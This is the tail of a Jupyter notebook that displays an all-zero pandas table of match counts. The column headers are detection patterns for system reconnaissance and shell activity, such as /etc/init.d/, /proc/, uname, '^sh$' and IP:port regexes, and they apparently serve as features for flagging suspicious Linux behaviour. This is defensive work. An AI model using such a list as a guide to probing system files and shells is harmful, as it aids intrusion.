       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>15 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "    bin/sed  /etc/rc  /etc/init.d/  /proc/  /etc/sed  /selinux  /sys/  bin/  \\\n",
       "0         0        0             0       0         0         0      0     0   \n",
       "1         0        0             0       0         0         0      0     0   \n",
       "2         0        0             0       0         0         0      0     0   \n",
       "3         0        0             0       0         0         0      0     0   \n",
       "4         0        0             0       0         0         0      0     0   \n",
       "5         0        0             0       0         0         0      0     0   \n",
       "6         0        0             0       0         0         0      0     0   \n",
       "7         0        0             0       0         0         0      0     0   \n",
       "8         0        0             0       0         0         0      0     0   \n",
       "9         0        0             0       0         0         0      0     0   \n",
       "10        0        0             0       0         0         0      0     0   \n",
       "11        0        0             0       0         0         0      0     0   \n",
       "12        0        0             0       0         0         0      0     0   \n",
       "13        0        0             0       0         0         0      0     0   \n",
       "14        0        0             0       0         0         0      0     0   \n",
       "\n",
       "    lsb-release  uname(.)($)  ...  ^sh$  ^sed$  \\\n",
       "0             0            0  ...     0      0   \n",
       "1             0            0  ...     0      0   \n",
       "2             0            0  ...     0      0   \n",
       "3             0            0  ...     0      0   \n",
       "4             0            0  ...     0      0   \n",
       "5             0            0  ...     0      0   \n",
       "6             0            0  ...     0      0   \n",
       "7             0            0  ...     0      0   \n",
       "8             0            0  ...     0      0   \n",
       "9             0            0  ...     0      0   \n",
       "10            0            0  ...     0      0   \n",
       "11            0            0  ...     0      0   \n",
       "12            0            0  ...     0      0   \n",
       "13            0            0  ...     0      0   \n",
       "14            0            0  ...     0      0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+  \\\n",
       "0                                        0   \n",
       "1                                        0   \n",
       "2                                        0   \n",
       "3                                        0   \n",
       "4                                        0   \n",
       "5                                        0   \n",
       "6                                        0   \n",
       "7                                        0   \n",
       "8                                        0   \n",
       "9                                        0   \n",
       "10                                       0   \n",
       "11                                       0   \n",
       "12                                       0   \n",
       "13                                       0   \n",
       "14                                       0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}  eth[0-9]$  0x[0-9a-zA-Z]{8}  \\\n",
       "0                                    0          0                 0   \n",
       "1                                    0          0                 0   \n",
       "2                                    0          0                 0   \n",
       "3                                    0          0                 0   \n",
       "4                                    0          0                 0   \n",
       "5                                    0          0                 0   \n",
       "6                                    0          0                 0   \n",
       "7                                    0          0                 0   \n",
       "8                                    0          0                 0   \n",
       "9                                    0          0                 0   \n",
       "10                                   0          0                 0   \n",
       "11                                   0          0                 0   \n",
       "12                                   0          0                 0   \n",
       "13                                   0          0                 0   \n",
       "14                                   0          0                 0   \n",
       "\n",
       "    permission:{0,1}[0-9]{0,4}  UID  GID  match  \n",
       "0                            0    0    0      0  \n",
       "1                            0    0    0      0  \n",
       "2                            0    0    0      0  \n",
       "3                            0    0    0      0  \n",
       "4                            0    0    0      0  \n",
       "5                            0    0    0      0  \n",
       "6                            0    0    0      0  \n",
       "7                            0    0    0      0  \n",
       "8                            0    0    0      0  \n",
       "9                            0    0    0      0  \n",
       "10                           0    0    0      0  \n",
       "11                           0    0    0      0  \n",
       "12                           0    0    0      0  \n",
       "13                           0    0    0      0  \n",
       "14                           0    0    0      0  \n",
       "\n",
       "[15 rows x 24 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for rem in fset.rem_lst:\n",
    "    display(rem.get_match_sentences())\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "125a1d8b627fe68767755740015967bae857d08bb92fb3fd0d9d8ed24f978d39"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
